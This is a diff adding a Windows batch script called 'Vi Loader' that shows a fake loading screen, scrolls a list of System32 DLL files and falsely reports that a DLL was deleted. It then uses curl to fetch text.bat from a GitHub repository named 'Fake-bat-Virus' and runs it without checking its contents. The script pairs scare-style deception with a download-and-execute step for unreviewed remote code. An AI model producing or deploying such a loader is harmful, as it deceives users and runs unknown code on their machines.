@@ -1,0 +1,53 @@
+@echo off
+title Vi Loader
+color a
+
+:: Fake Loading Sequence
+echo Loading ViGet...
+timeout /t 1 >nul
+cls
+echo Loading ViGet..
+timeout /t 1 >nul
+cls
+echo Loading ViGet.
+timeout /t 1 >nul
+cls
+
+:: Listing files (The "Matrix" effect)
+dir /s /b C:\Windows\System32 | findstr /i ".dll"
+timeout /t 4
+cls
+
+color b
+echo [!]ViGet[!] : Vi Downloader
+echo [!]UpDatE (v1.9): Fix Errors, Download Uri
+timeout /t 3
+cls
+
+echo Loading Vi Uri ...
+:: Fixed variable syntax
+set "URI=[Unknown 404]"
+echo Status: %URI%
+timeout /t 3
+cls
+
+dir /s /b C:\Windows\System32 | findstr /i ".dll"
+timeout /t 3
+cls
+
+echo [?] VIDLL has been deleted
+timeout /t 2
+echo [*ROOT*] Calling Downloader...
+
+:: Using CURL instead of WGET (Native to Windows)
+curl -L "https://raw.githubusercontent.com/son5566/Fake-bat-Virus/refs/heads/main/text.bat" -o text.bat
+
+:: Check if the file was actually downloaded before calling it
+if exist text.bat (
+    echo [SUCCESS] Running text.bat...
+    timeout /t 1 >nul
+    call text.bat
+) else (
+    echo [ERROR] Could not download the file. Check your internet or URL.
+    pause
+)
